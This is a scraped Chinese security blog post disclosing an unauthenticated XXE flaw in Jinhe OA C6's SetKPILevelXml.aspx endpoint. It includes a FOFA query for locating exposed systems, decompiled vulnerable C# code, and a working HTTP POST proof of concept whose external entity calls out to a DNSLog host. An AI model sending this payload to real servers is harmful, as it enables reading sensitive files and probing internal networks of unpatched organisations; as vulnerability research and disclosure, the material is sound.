---
title: "金和OA SetKPILevelXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-SetKPILevelXml-xxe.html
asset_dir: assets/金和oa-setkpilevelxml.aspx-xxe漏洞
---

# 金和OA SetKPILevelXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/1 13:31
* 368浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

编程语言教程

企业安全咨询

安全研究报告


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `SetKPILevelXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `SetKPILevelXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **SetKPILevelXml** 的处理逻辑

深入探索

VPN服务

Windows安全工具

文本剥离工具

```
protected void Page_Load(object sender, EventArgs e)
{
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Appraise/SetKPILevelXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA SetKPILevelXml.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA SetKPILevelXml.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-SetKPILevelXml-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-SetKPILevelXml-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全工具开发

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-SetKPILevelXml-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-SetKPILevelXml-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 